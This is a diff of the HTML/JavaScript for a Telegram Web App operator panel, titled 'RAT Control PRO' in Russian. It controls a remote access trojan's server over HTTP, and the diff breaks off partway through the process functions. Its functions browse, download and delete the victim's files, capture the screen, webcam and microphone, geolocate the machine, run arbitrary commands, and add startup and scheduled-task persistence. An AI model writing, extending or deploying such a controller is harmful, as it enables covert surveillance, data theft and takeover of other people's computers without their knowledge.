@@ -1,158 +1,988 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RAT Control</title>
+    <title>RAT Control PRO</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: var(--tg-theme-bg-color, #f5f5f5);
             color: var(--tg-theme-text-color, #333);
-            padding: 20px;
-            margin: 0;
+            padding: 16px;
+            padding-bottom: 80px;
         }
-        h1 { font-size: 24px; margin-bottom: 10px; }
+
+        /* Шапка */
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: -16px -16px 20px -16px;
+            padding: 30px 20px;
+            border-radius: 0 0 30px 30px;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 5px;
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* Статистика в шапке */
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            background: rgba(255,255,255,0.15);
+            padding: 15px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            opacity: 0.8;
+        }
+
+        /* Вкладки */
+        .tabs {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            background: var(--tg-theme-secondary-bg-color, white);
+            padding: 8px;
+            border-radius: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .tab {
+            text-align: center;
+            padding: 12px 4px;
+            border-radius: 25px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #666;
+        }
+
+        .tab.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 4px 10px rgba(102,126,234,0.3);
+        }
+
+        /* Карточки */
         .card {
             background: var(--tg-theme-secondary-bg-color, white);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border: 1px solid rgba(0,0,0,0.03);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #667eea;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 10px;
+        }
+
+        /* Сетки кнопок */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .grid-4 {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+
+        /* Кнопки */
+        .btn {
+            border: none;
+            border-radius: 12px;
+            padding: 14px 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: #f8f9fa;
+            color: #333;
+            border: 1px solid #eee;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+            background: #e9ecef;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #218838 100%);
+            color: white;
+            border: none;
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);
+            color: #333;
+            border: none;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            color: white;
+            border: none;
+        }
+
+        .btn-info {
+            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
+            color: white;
+            border: none;
+        }
+
+        .btn-purple {
+            background: linear-gradient(135deg, #6f42c1 0%, #5a32a3 100%);
+            color: white;
+            border: none;
+        }
+
+        /* Поля ввода */
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin: 15px 0;
+        }
+
+        .input {
+            flex: 1;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: all 0.2s;
+            background: #fafafa;
+        }
+
+        .input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+        }
+
+        /* Путь */
+        .path-bar {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+
+        /* Список файлов */
+        .file-list {
+            max-height: 400px;
+            overflow-y: auto;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            margin-top: 15px;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #e9ecef;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .file-item:hover {
+            background: #f8f9fa;
+        }
+
+        .file-icon {
+            font-size: 24px;
+            margin-right: 15px;
+        }
+
+        .file-name {
+            flex: 1;
+            font-weight: 500;
+        }
+
+        .file-size {
+            color: #666;
+            margin-right: 15px;
+            font-size: 13px;
+        }
+
+        .file-date {
+            color: #666;
+            font-size: 12px;
+        }
+
+        /* Процессы */
+        .proc-table {
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 15px;
+        }
+
+        .proc-header {
+            display: grid;
+            grid-template-columns: 70px 1fr 80px 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .proc-row {
+            display: grid;
+            grid-template-columns: 70px 1fr 80px 80px;
+            padding: 10px 12px;
+            border-bottom: 1px solid #e9ecef;
+            font-size: 12px;
+        }
+
+        .proc-row:hover {
+            background: #f8f9fa;
+        }
+
+        .proc-pid { color: #667eea; font-weight: 500; }
+        .proc-cpu { text-align: right; color: #28a745; }
+        .proc-ram { text-align: right; color: #17a2b8; }
+
+        /* Вывод */
+        .output {
+            background: #1a1a1a;
+            color: #00ff00;
             border-radius: 12px;
             padding: 16px;
-            margin-bottom: 16px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-        button {
-            background: var(--tg-theme-button-color, #0088cc);
-            color: var(--tg-theme-button-text-color, white);
-            border: none;
-            border-radius: 10px;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: 500;
-            width: 100%;
-            margin-bottom: 8px;
-            cursor: pointer;
-        }
-        .output {
-            background: var(--tg-theme-bg-color, #f0f0f0);
-            border-radius: 10px;
-            padding: 16px;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             font-size: 13px;
             line-height: 1.6;
             white-space: pre-wrap;
             max-height: 300px;
             overflow-y: auto;
+            margin: 15px 0;
         }
+
+        /* Статус */
         .status {
-            margin-top: 10px;
-            padding: 8px;
-            border-radius: 8px;
-            text-align: center;
-            display: none;
-        }
-        .status.success { background: #d4edda; color: #155724; display: block; }
-        .status.error { background: #f8d7da; color: #721c24; display: block; }
-        .status.warning { background: #fff3cd; color: #856404; display: block; }
-        .ip-input {
-            width: 100%;
             padding: 12px;
-            border: 1px solid var(--tg-theme-hint-color, #ddd);
-            border-radius: 8px;
-            margin-bottom: 10px;
-            box-sizing: border-box;
+            border-radius: 12px;
+            margin: 10px 0;
+            display: none;
+            font-weight: 500;
+        }
+
+        .status.show { display: block; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+        .status.warning { background: #fff3cd; color: #856404; }
+
+        /* Подключение */
+        .connection-panel {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .connection-input {
+            background: rgba(255,255,255,0.2);
+            border: 2px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            width: 100%;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+
+        .connection-input::placeholder {
+            color: rgba(255,255,255,0.6);
+        }
+
+        .connection-status {
+            background: rgba(255,255,255,0.15);
+            padding: 12px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+            backdrop-filter: blur(5px);
+        }
+
+        /* Нижняя панель */
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--tg-theme-secondary-bg-color, white);
+            padding: 12px 16px;
+            border-top: 2px solid #e0e0e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+        }
+
+        .bottom-bar button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .bottom-bar span {
+            color: #666;
+            font-size: 13px;
+        }
+
+        .online-dot {
+            width: 10px;
+            height: 10px;
+            background: #28a745;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.6; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Скролл */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
         }
     </style>
 </head>
 <body>
-    <h1>🤖 RAT CONTROL</h1>
-    <p>Управление компьютером</p>
-
-    <div class="card">
-        <h3>🔌 Подключение к серверу</h3>
-        <input type="text" id="serverIP" class="ip-input" placeholder="IP адрес компьютера" value="localhost">
-        <button onclick="testConnection()">🔄 Проверить соединение</button>
-        <div id="connectionStatus" class="status"></div>
+    <div class="header">
+        <h1>🤖 RAT CONTROL PRO</h1>
+        <p>Полное управление компьютером</p>
+        <div class="stats-row" id="quickStats">
+            <div class="stat-item">
+                <div class="stat-value" id="statCPU">0%</div>
+                <div class="stat-label">CPU</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="statRAM">0%</div>
+                <div class="stat-label">RAM</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="statDISK">0%</div>
+                <div class="stat-label">Диск</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="statPROC">0</div>
+                <div class="stat-label">Процессы</div>
+            </div>
+        </div>
     </div>
 
-    <div class="card">
-        <h3>📊 ИНФОРМАЦИЯ</h3>
-        <button onclick="sendCommand('info')">🔄 Обновить информацию</button>
-        <div id="infoOutput" class="output">Нажмите кнопку</div>
+    <!-- Панель подключения -->
+    <div class="connection-panel">
+        <h3>🔌 ПОДКЛЮЧЕНИЕ К СЕРВЕРУ</h3>
+        <input type="text" id="serverIP" class="connection-input" placeholder="IP адрес компьютера" value="192.168.1.100">
+        <div style="display: flex; gap: 10px;">
+            <button class="btn" style="flex: 1; background: rgba(255,255,255,0.2); color: white;" onclick="testConnection()">🔄 Проверить</button>
+            <button class="btn" style="flex: 1; background: rgba(255,255,255,0.2); color: white;" onclick="autoDetectIP()">🔍 Авто</button>
+        </div>
+        <div id="connectionStatus" class="connection-status">⏳ Ожидание подключения...</div>
+    </div>
+
+    <!-- Вкладки -->
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab('dashboard')">📊 Дашборд</div>
+        <div class="tab" onclick="switchTab('system')">⚙️ Система</div>
+        <div class="tab" onclick="switchTab('files')">📁 Файлы</div>
+        <div class="tab" onclick="switchTab('processes')">📋 Процессы</div>
+        <div class="tab" onclick="switchTab('network')">🌐 Сеть</div>
+        <div class="tab" onclick="switchTab('media')">🎥 Медиа</div>
+        <div class="tab" onclick="switchTab('control')">⚡ Управление</div>
+        <div class="tab" onclick="switchTab('info')">ℹ️ Инфо</div>
+    </div>
+
+    <!-- ДАШБОРД -->
+    <div id="tab-dashboard" class="tab-content active">
+        <div class="card">
+            <div class="card-title">📊 БЫСТРАЯ ИНФОРМАЦИЯ</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="loadDashboard()">🔄 Обновить всё</button>
+                <button class="btn btn-success" onclick="startAutoRefresh()">⏱️ Авто (5с)</button>
+            </div>
+            <div id="dashboardOutput" class="output">Нажмите кнопку для загрузки</div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">⚡ БЫСТРЫЕ ДЕЙСТВИЯ</div>
+            <div class="grid-3">
+                <button class="btn btn-info" onclick="sendCommand('screen')">📸 Скрин</button>
+                <button class="btn btn-warning" onclick="sendCommand('lock')">🔒 Блок</button>
+                <button class="btn btn-danger" onclick="sendCommand('shutdown')">⏻ Выкл</button>
+                <button class="btn btn-success" onclick="sendCommand('restart')">🔄 Рестарт</button>
+                <button class="btn btn-purple" onclick="sendCommand('processes')">📋 Процессы</button>
+                <button class="btn" onclick="sendCommand('cmd dir')">📁 Dir</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- СИСТЕМА -->
+    <div id="tab-system" class="tab-content">
+        <div class="card">
+            <div class="card-title">🖥️ ИНФОРМАЦИЯ О СИСТЕМЕ</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="sendCommand('system')">📊 Полная</button>
+                <button class="btn btn-info" onclick="sendCommand('cpu')">⚙️ CPU</button>
+                <button class="btn btn-success" onclick="sendCommand('memory')">💾 RAM</button>
+                <button class="btn btn-warning" onclick="sendCommand('disk')">💿 Диски</button>
+                <button class="btn btn-purple" onclick="sendCommand('battery')">🔋 Батарея</button>
+                <button class="btn" onclick="sendCommand('temperature')">🌡️ Температура</button>
+            </div>
+            <div id="systemOutput" class="output"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">📦 ОБОРУДОВАНИЕ</div>
+            <div class="grid-2">
+                <button class="btn" onclick="sendCommand('hardware')">🖥️ Мат. плата</button>
+                <button class="btn" onclick="sendCommand('gpu')">🎮 Видеокарта</button>
+                <button class="btn" onclick="sendCommand('drives')">💽 Накопители</button>
+                <button class="btn" onclick="sendCommand('usb')">🔌 USB</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ФАЙЛЫ -->
+    <div id="tab-files" class="tab-content">
+        <div class="card">
+            <div class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</div>
+            
+            <div class="path-bar" id="currentPath">C:\</div>
+            
+            <div class="grid-3">
+                <button class="btn btn-primary" onclick="listFiles()">📋 Список</button>
+                <button class="btn btn-warning" onclick="goBack()">⬆️ Назад</button>
+                <button class="btn btn-info" onclick="refreshFiles()">🔄 Обновить</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="folderPath" class="input" placeholder="Путь к папке">
+                <button class="btn btn-primary" onclick="changeDir()">Перейти</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="fileName" class="input" placeholder="Имя файла">
+                <button class="btn btn-success" onclick="downloadFile()">📥 Скачать</button>
+                <button class="btn btn-danger" onclick="deleteFile()">🗑️ Удалить</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="searchQuery" class="input" placeholder="Поиск">
+                <button class="btn btn-info" onclick="searchFiles()">🔍 Найти</button>
+            </div>
+
+            <div id="fileList" class="file-list"></div>
+        </div>
+    </div>
+
+    <!-- ПРОЦЕССЫ -->
+    <div id="tab-processes" class="tab-content">
+        <div class="card">
+            <div class="card-title">📋 МЕНЕДЖЕР ПРОЦЕССОВ</div>
+            
+            <div class="grid-3">
+                <button class="btn btn-primary" onclick="sendCommand('processes')">📊 Все</button>
+                <button class="btn btn-info" onclick="sendCommand('topcpu')">⚡ По CPU</button>
+                <button class="btn btn-success" onclick="sendCommand('topram')">💾 По RAM</button>
+            </div>
+
+            <div class="input-group">
+                <input type="number" id="killPid" class="input" placeholder="PID">
+                <button class="btn btn-danger" onclick="killProcess()">🔪 Убить</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="killName" class="input" placeholder="Имя процесса">
+                <button class="btn btn-warning" onclick="killProcessByName()">🔪 По имени</button>
+            </div>
+
+            <div class="proc-table">
+                <div class="proc-header">
+                    <span>PID</span>
+                    <span>Имя</span>
+                    <span>CPU %</span>
+                    <span>RAM %</span>
+                </div>
+                <div id="processesList"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- СЕТЬ -->
+    <div id="tab-network" class="tab-content">
+        <div class="card">
+            <div class="card-title">🌐 СЕТЕВАЯ ИНФОРМАЦИЯ</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="sendCommand('network')">📡 Инфо</button>
+                <button class="btn btn-info" onclick="sendCommand('externalip')">🌍 Внешний IP</button>
+                <button class="btn btn-success" onclick="sendCommand('wifi')">📶 Wi-Fi</button>
+                <button class="btn btn-warning" onclick="sendCommand('connections')">🔗 Соединения</button>
+            </div>
+            <div id="networkOutput" class="output"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">📍 ГЕОЛОКАЦИЯ</div>
+            <button class="btn btn-purple" onclick="sendCommand('geo')">🌍 Определить</button>
+            <div id="geoOutput" class="output"></div>
+        </div>
+    </div>
+
+    <!-- МЕДИА -->
+    <div id="tab-media" class="tab-content">
+        <div class="card">
+            <div class="card-title">🎥 ЗАХВАТ МЕДИА</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="sendCommand('screen')">📸 Скриншот</button>
+                <button class="btn btn-success" onclick="sendCommand('screenfull')">🖥️ Весь экран</button>
+                <button class="btn btn-info" onclick="sendCommand('webcam')">📷 Вебкамера</button>
+                <button class="btn btn-warning" onclick="sendCommand('mic')">🎤 Микрофон</button>
+                <button class="btn btn-purple" onclick="sendCommand('mic10')">🎤 10 сек</button>
+                <button class="btn" onclick="sendCommand('mic30')">🎤 30 сек</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- УПРАВЛЕНИЕ -->
+    <div id="tab-control" class="tab-content">
+        <div class="card">
+            <div class="card-title">⚡ ПИТАНИЕ</div>
+            <div class="grid-2">
+                <button class="btn btn-danger" onclick="sendCommand('shutdown')">⏻ Выключить</button>
+                <button class="btn btn-warning" onclick="sendCommand('restart')">🔄 Перезагрузить</button>
+                <button class="btn btn-info" onclick="sendCommand('lock')">🔒 Блокировка</button>
+                <button class="btn btn-success" onclick="sendCommand('sleep')">😴 Сон</button>
+                <button class="btn btn-purple" onclick="sendCommand('logout')">👋 Выйти</button>
+                <button class="btn" onclick="sendCommand('hibernate')">💤 Гибернация</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">💻 КОМАНДЫ</div>
+            <div class="input-group">
+                <input type="text" id="customCmd" class="input" placeholder="Введите команду">
+                <button class="btn btn-primary" onclick="runCustomCommand()">Выполнить</button>
+            </div>
+            <div class="grid-4">
+                <button class="btn btn-sm" onclick="quickCmd('dir')">dir</button>
+                <button class="btn btn-sm" onclick="quickCmd('ipconfig')">ipconfig</button>
+                <button class="btn btn-sm" onclick="quickCmd('systeminfo')">systeminfo</button>
+                <button class="btn btn-sm" onclick="quickCmd('tasklist')">tasklist</button>
+            </div>
+            <div id="cmdOutput" class="output"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">📅 ПЛАНИРОВЩИК</div>
+            <div class="grid-2">
+                <button class="btn" onclick="sendCommand('tasks')">📋 Задачи</button>
+                <button class="btn" onclick="sendCommand('taskcreate')">➕ Создать</button>
+                <button class="btn" onclick="sendCommand('taskdelete')">❌ Удалить</button>
+                <button class="btn" onclick="sendCommand('taskrun')">▶️ Запустить</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">🚀 АВТОЗАГРУЗКА</div>
+            <div class="grid-2">
+                <button class="btn" onclick="sendCommand('startuplist')">📋 Список</button>
+                <button class="btn" onclick="sendCommand('startupadd')">➕ Добавить</button>
+                <button class="btn" onclick="sendCommand('startupremove')">➖ Удалить</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ИНФО -->
+    <div id="tab-info" class="tab-content">
+        <div class="card">
+            <div class="card-title">ℹ️ О СИСТЕМЕ</div>
+            <div class="grid-2">
+                <button class="btn" onclick="sendCommand('os')">💿 ОС</button>
+                <button class="btn" onclick="sendCommand('user')">👤 Пользователь</button>
+                <button class="btn" onclick="sendCommand('env')">🌍 Переменные</button>
+                <button class="btn" onclick="sendCommand('uptime')">⏱️ Время работы</button>
+                <button class="btn" onclick="sendCommand('datetime')">📅 Дата/время</button>
+            </div>
+            <div id="infoOutput" class="output"></div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">🔧 ДИАГНОСТИКА</div>
+            <div class="grid-2">
+                <button class="btn" onclick="sendCommand('logs')">📋 Журнал</button>
+                <button class="btn" onclick="sendCommand('errors')">⚠️ Ошибки</button>
+                <button class="btn" onclick="sendCommand('performance')">📊 Производительность</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Статус -->
+    <div id="status" class="status"></div>
+
+    <!-- Нижняя панель -->
+    <div class="bottom-bar">
+        <span><span class="online-dot"></span> <span id="connectionText">Не подключено</span></span>
+        <button onclick="tg.close()">ЗАКРЫТЬ</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Растягиваем на весь экран
+        tg.expand();
+        tg.ready();
 
-        let serverIP = 'localhost';
+        // Настройки
+        let serverIP = localStorage.getItem('serverIP') || '192.168.1.100';
         const port = 5000;
+        let currentDir = 'C:\\';
+        let autoRefresh = false;
+        let refreshInterval = null;
+        let pendingRequests = {};
 
+        // Инициализация
+        document.getElementById('serverIP').value = serverIP;
+        loadDashboard();
+        checkConnection();
+
+        // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
         function getBaseUrl() {
             return `http://${serverIP}:${port}`;
         }
 
-        async function testConnection() {
-            serverIP = document.getElementById('serverIP').value;
-            const statusDiv = document.getElementById('connectionStatus');
-            statusDiv.className = 'status warning';
-            statusDiv.textContent = '⏳ Проверка...';
+        function showStatus(text, type = 'info') {
+            const status = document.getElementById('status');
+            status.className = 'status show ' + type;
+            status.textContent = text;
+            setTimeout(() => status.classList.remove('show'), 3000);
+        }
 
+        async function apiRequest(endpoint, method = 'GET', data = null) {
+            const url = getBaseUrl() + endpoint;
+            const options = {
+                method: method,
+                headers: { 'Content-Type': 'application/json' }
+            };
+            if (data) options.body = JSON.stringify(data);
+
+            try {
+                const response = await fetch(url, options);
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                showStatus('❌ Ошибка: ' + error.message, 'error');
+                throw error;
+            }
+        }
+
+        async function sendCommand(cmd, params = {}) {
+            showStatus('⏳ Отправка...', 'warning');
+            try {
+                const data = await apiRequest('/api/command', 'POST', { command: cmd, params: params });
+                if (data.success) {
+                    showStatus('✅ Команда выполнена', 'success');
+                    return data.data;
+                } else {
+                    showStatus('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                showStatus('❌ Ошибка', 'error');
+            }
+        }
+
+        // ==================== ПОДКЛЮЧЕНИЕ ====================
+        async function checkConnection() {
             try {
                 const response = await fetch(getBaseUrl() + '/');
                 const text = await response.text();
                 if (text.includes('✅')) {
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '✅ Подключено к серверу!';
-                } else {
-                    throw new Error('Неверный ответ');
+                    document.getElementById('connectionStatus').innerHTML = '✅ Подключено к серверу';
+                    document.getElementById('connectionText').innerHTML = '🟢 Онлайн';
+                    document.getElementById('connectionStatus').style.background = 'rgba(40,167,69,0.3)';
+                    return true;
                 }
             } catch (error) {
-                statusDiv.className = 'status error';
-                statusDiv.textContent = '❌ Ошибка: ' + error.message;
+                document.getElementById('connectionStatus').innerHTML = '❌ Нет соединения';
+                document.getElementById('connectionText').innerHTML = '🔴 Офлайн';
+                document.getElementById('connectionStatus').style.background = 'rgba(220,53,69,0.3)';
+                return false;
             }
         }
 
-        async function sendCommand(cmd) {
+        async function testConnection() {
             serverIP = document.getElementById('serverIP').value;
-            const outputDiv = document.getElementById('infoOutput');
-            const statusDiv = document.getElementById('connectionStatus');
-            outputDiv.textContent = '⏳ Загрузка...';
+            localStorage.setItem('serverIP', serverIP);
+            document.getElementById('connectionStatus').innerHTML = '⏳ Проверка...';
+            await checkConnection();
+        }
 
+        function autoDetectIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const localIP = ip.replace(/\d+$/, '1');
+                    document.getElementById('serverIP').value = localIP;
+                });
+        }
+
+        // ==================== ДАШБОРД ====================
+        async function loadDashboard() {
             try {
-                const response = await fetch(getBaseUrl() + '/api/info');
-                if (!response.ok) throw new Error('HTTP error ' + response.status);
-                const data = await response.json();
-
+                const data = await apiRequest('/api/dashboard');
                 if (data.success) {
-                    const d = data.data;
-                    outputDiv.innerHTML = `
-📊 ИНФОРМАЦИЯ О СИСТЕМЕ
+                    document.getElementById('statCPU').textContent = data.data.cpu + '%';
+                    document.getElementById('statRAM').textContent = data.data.ram + '%';
+                    document.getElementById('statDISK').textContent = data.data.disk + '%';
+                    document.getElementById('statPROC').textContent = data.data.processes;
+                    
+                    document.getElementById('dashboardOutput').innerHTML = `
+📊 **ИНФОРМАЦИЯ**
 ═══════════════════════
-💻 Компьютер: ${d.computer}
-👤 Пользователь: ${d.user}
-🖥️ ОС: ${d.os}
-⏱️ Запуск: ${d.boot}
+💻 Компьютер: ${data.data.computer}
+👤 Пользователь: ${data.data.user}
+⏱️ Запуск: ${data.data.boot}
 
-⚙️ Процессор: ${d.cpu}%
-💾 ОЗУ: ${d.ram_used}/${d.ram_total} ГБ (${d.ram_percent}%)
-💿 Диск C: ${d.disk_used}/${d.disk_total} ГБ (${d.disk_percent}%)
-🌐 IP: ${d.ip}
+⚙️ CPU: ${data.data.cpu}%
+💾 RAM: ${data.data.ram_used}/${data.data.ram_total} ГБ (${data.data.ram}%)
+💿 Диск: ${data.data.disk_used}/${data.data.disk_total} ГБ (${data.data.disk}%)
+🌐 IP: ${data.data.ip}
+📊 Процессов: ${data.data.processes}
                     `;
-                    statusDiv.className = 'status success';
-                    statusDiv.textContent = '✅ Данные получены';
-                } else {
-                    throw new Error('Ошибка сервера');
                 }
             } catch (error) {
-                outputDiv.textContent = '❌ Ошибка: ' + error.message;
-                statusDiv.className = 'status error';
-                statusDiv.textContent = '❌ Нет соединения';
+                document.getElementById('dashboardOutput').innerHTML = '❌ Ошибка загрузки';
             }
         }
 
-        // Пробуем подключиться при загрузке
-        setTimeout(testConnection, 500);
+        function startAutoRefresh() {
+            if (autoRefresh) {
+                clearInterval(refreshInterval);
+                autoRefresh = false;
+                showStatus('⏹️ Автообновление отключено', 'warning');
+            } else {
+                refreshInterval = setInterval(loadDashboard, 5000);
+                autoRefresh = true;
+                showStatus('⏱️ Автообновление включено', 'success');
+            }
+        }
+
+        // ==================== ФАЙЛЫ ====================
+        async function listFiles() {
+            try {
+                const data = await apiRequest('/api/files?path=' + encodeURIComponent(currentDir));
+                if (data.success) {
+                    currentDir = data.current_dir;
+                    document.getElementById('currentPath').textContent = currentDir;
+                    
+                    let html = '';
+                    data.files.forEach(f => {
+                        const icon = f.is_dir ? '📁' : '📄';
+                        html += `
+                            <div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
+                                <span class="file-icon">${icon}</span>
+                                <span class="file-name">${f.name}</span>
+                                <span class="file-size">${f.size}</span>
+                                <span class="file-date">${f.modified}</span>
+                            </div>
+                        `;
+                    });
+                    document.getElementById('fileList').innerHTML = html;
+                }
+            } catch (error) {
+                document.getElementById('fileList').innerHTML = '<div class="file-item">❌ Ошибка загрузки</div>';
+            }
+        }
+
+        async function goBack() {
+            currentDir = currentDir.substring(0, currentDir.lastIndexOf('\\')) || 'C:\\';
+            listFiles();
+        }
+
+        async function changeDir() {
+            const path = document.getElementById('folderPath').value;
+            if (path) {
+                currentDir = path;
+                listFiles();
+                document.getElementById('folderPath').value = '';
+            }
+        }
+
+        function refreshFiles() {
+            listFiles();
+        }
+
+        function selectFile(name) {
+            document.getElementById('fileName').value = name;
+        }
+
+        async function downloadFile() {
+            const name = document.getElementById('fileName').value;
+            if (name) {
+                window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + name));
+            }
+        }
+
+        async function deleteFile() {
+            const name = document.getElementById('fileName').value;
+            if (name && confirm('Удалить ' + name + '?')) {
+                await apiRequest('/api/delete', 'POST', { path: currentDir + '\\' + name });
+                listFiles();
+            }
+        }
+
+        async function searchFiles() {
+            const query = document.getElementById('searchQuery').value;
+            if (query) {
+                const data = await apiRequest('/api/search?q=' + encodeURIComponent(query) + '&path=' + encodeURIComponent(currentDir));
+                if (data.success) {
+                    let html = '';
+                    data.results.forEach(f => {
+                        html += `<div class="file-item">📄 ${f.name} (${f.path})</div>`;
+                    });
+                    document.getElementById('fileList').innerHTML = html;
+                }
+            }
+        }
+
+        // ==================== ПРОЦЕССЫ ====================
+        async function killProcess() {
+            const pid = document.getElementById('killPid').value;
+            if (pid) {
+                await apiRequest('/api/kill', 'POST', { pid: parseInt(pid) });
